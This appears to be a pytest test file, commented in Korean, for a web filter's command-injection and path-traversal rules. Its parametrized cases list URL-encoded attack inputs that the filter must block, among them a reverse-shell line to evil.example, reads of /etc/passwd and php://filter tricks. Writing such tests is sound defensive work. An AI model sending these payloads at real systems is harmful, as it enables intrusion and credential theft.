"""OS 명령어 삽입(CMD)·경로 조작(PATH) 룰."""
import pytest

from conftest import rule_ids
from mpg.detection import Action, Field, InspectionRequest, Location


def check(pipe, value, path="/api/tools/ping", name="host", loc=Location.QUERY):
    return pipe.inspect(InspectionRequest("GET", path, (Field(loc, name, value),)))


@pytest.mark.parametrize("payload", [
    "127.0.0.1%3Bid",                       # ;id
    "127.0.0.1%7Cwhoami",                   # |whoami
    "%60id%60",                             # `id`
    "%24%28whoami%29",                      # $(whoami)
    "127.0.0.1%0Aid",                       # 개행 뒤 명령
    "%3Bcat%24%7BIFS%7D%2Fetc%2Fpasswd",    # ;cat${IFS}/etc/passwd
    "%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fevil.example%2F4444%200%3E%261",
    "%26%20cmd%20%2Fc%20whoami",
    "%253Bid",                              # 이중 인코딩
])
def test_command_injection_blocked(pipe, payload):
    v = check(pipe, payload)
    assert v.action is Action.BLOCK, rule_ids(v)
    assert any(r.startswith("CMD-") for r in rule_ids(v))


@pytest.mark.parametrize("payload", [
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "%2Fetc%2Fpasswd",
    "..%255c..%255c..%255cwindows%255cwin.ini",
    "....%2F%2F....%2F%2Fetc%2Fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%2Fpasswd",   # 오버롱 UTF-8 '/'
    "php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex.php",
    "file%3A%2F%2F%2Fetc%2Fpasswd",
    "..%2F..%2F..%2Fetc%2Fpasswd%2500.png",
])
def test_path_traversal_blocked(pipe, payload):
    v = check(pipe, payload, path="/api/download", name="file")
    assert v.action is Action.BLOCK, rule_ids(v)
    assert any(r.startswith("PATH-") for r in rule_ids(v))


@pytest.mark.parametrize("value", [
    "127.0.0.1", "example.com", "2001:db8::1",
    "report_2026.pdf", "2026%2F11%2Finvoice-123.pdf", "images%2Flogo.png", "notes..txt",
    "tom+%26+jerry", "salt+%26+pepper", "cat+food",
])
def test_ordinary_values_allowed(pipe, value):
    assert check(pipe, value, path="/api/download", name="file").action is Action.ALLOW


@pytest.mark.parametrize("text", [
    "import Button from '../../components/Button' 경로가 틀렸대요",   # 탈출 시퀀스만 (+4)
    "cat 명령으로 /etc/nginx/nginx.conf 를 봤어요",                   # 민감 파일 아님
    "ls -al 결과에서 숨김 파일만 보고 싶어요",                          # 구분자 없음
    "jQuery $(document).ready 가 두 번 불려요",                        # $( 뒤가 명령이 아님
])
def test_shell_and_path_talk_on_board_is_allowed(pipe, text):
    v = check(pipe, text, path="/api/qna/posts", name="content", loc=Location.JSON)
    assert v.action is Action.ALLOW, rule_ids(v)
